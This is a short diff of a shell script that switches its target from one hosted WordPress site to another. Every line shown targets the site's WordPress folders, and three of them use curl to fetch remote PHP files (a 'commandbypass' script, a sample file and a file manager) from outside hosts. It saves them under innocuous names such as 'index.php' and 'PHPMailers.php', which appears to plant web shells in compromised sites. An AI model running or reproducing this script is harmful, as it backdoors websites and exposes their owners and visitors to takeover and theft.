@@ -1,4 +1,4 @@
-base="/home/u641186252/domains/americanjuggalo.com/public_html"; \
+base="/home/u641186252/domains/mexicanfootprints.co.uk/public_html"; \
 [ -d "$base/wp-admin/css/colors/blue" ] && curl -s -o "$base/wp-admin/css/colors/blue/index.php" https://oldbreak.com/commandbypass.txt; \
 [ -d "$base/wp-includes/PHPMailer" ] && curl -s -o "$base/wp-includes/PHPMailer/PHPMailers.php" https://raw.githubusercontent.com/riansyahferi12-ui/my-php-project/refs/heads/main/sample.php; \
 [ -d "$base/wp-content/languages" ] && curl -s -o "$base/wp-content/languages/index.php" https://raw.githubusercontent.com/riansyahferi12-ui/my-php-project/refs/heads/main/simplefilemanager.php; \
